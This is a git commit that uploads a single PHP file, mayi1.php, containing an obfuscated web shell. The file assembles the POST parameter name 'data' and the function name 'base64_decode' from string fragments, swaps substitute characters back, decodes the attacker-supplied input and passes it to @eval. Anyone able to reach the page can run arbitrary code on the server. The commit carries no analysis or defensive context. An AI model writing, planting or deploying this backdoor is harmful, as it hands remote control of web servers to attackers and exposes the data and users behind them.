4d48d7cc07b1917538eb2c84f1dac7ba9ce116fd
black2729134369 <79140153+black2729134369@users.noreply.github.com>
2025-09-28 15:29:05 +0800

    Add files via upload

---
+++ mayi1.php
@@ -0,0 +1,15 @@
+<?php
+
+$func = $_POST;
+$ac = 'a';
+$pc = 'at';
+$params = 'd' . $pc . $ac;
+$data = $func[$params];
+$arr = array("|" => "a", "!" => "b", "@" => "c", "_" => "d",);
+$result = strtr($data, $arr);
+$de2 = '32_de';
+$de = "base" . $de2 . "flag";
+$de = str_replace("32", "64", $de);
+$de = str_replace("flag", "code", $de);
+$data = $de($result);
+@eval($data);
